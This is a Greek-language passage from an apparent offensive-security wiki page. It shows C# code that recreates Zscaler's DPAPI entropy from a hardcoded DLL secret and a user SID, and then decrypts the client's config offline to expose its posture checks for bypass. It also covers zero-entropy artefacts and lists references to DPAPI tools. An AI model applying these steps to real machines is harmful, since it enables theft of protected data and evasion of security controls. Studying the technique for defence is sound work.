Ο αλγόριθμος που υλοποιείται από το DLL είναι ισοδύναμος με:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

Επειδή το μυστικό είναι ενσωματωμένο σε ένα DLL που μπορεί να διαβαστεί από τον δίσκο, **κάθε τοπικός επιτιθέμενος με δικαιώματα SYSTEM μπορεί να αναδημιουργήσει την εντροπία για οποιοδήποτε SID** και να αποκρυπτογραφήσει τα blobs offline:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Η αποκρυπτογράφηση αποδίδει ολόκληρη τη διαμόρφωση JSON, συμπεριλαμβανομένων όλων των **ελέγχων κατάστασης συσκευής** και των αναμενόμενων τιμών τους — πληροφορίες πολύτιμες για προσπάθειες παράκαμψης από την πλευρά του client.

> ΣΥΜΒΟΥΛΗ: Τα άλλα κρυπτογραφημένα artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) προστατεύονται με DPAPI **χωρίς** entropy (16 μηδενικά bytes). Επομένως, μπορούν να αποκρυπτογραφηθούν απευθείας με το `ProtectedData.Unprotect`, μόλις αποκτηθούν δικαιώματα SYSTEM.

## References

- [1] [Synacktiv – Πρέπει να εμπιστεύεστε το zero trust σας; Παράκαμψη των ελέγχων κατάστασης του Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Μυστικά DPAPI. Ανάλυση ασφάλειας και ανάκτηση δεδομένων στο DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Ανάγνωση κρυπτογραφημένων μυστικών DPAPI με Mimikatz και C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Ευπάθεια πλαστογράφησης στο Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Βελτίωση της ασφάλειας των cookies του Chrome στα Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Απλή εξαγωγή του προαιρετικού entropy του DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Σημειώσεις έκδοσης του hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – Αποθετήριο GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – Σελίδα έργου στο PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: Κατάχρηση AD ACL, cracking Argon2 του KeePassXC και αποκρυπτογράφηση DPAPI για πρόσβαση διαχειριστή DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Χρήση και επιλογές](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
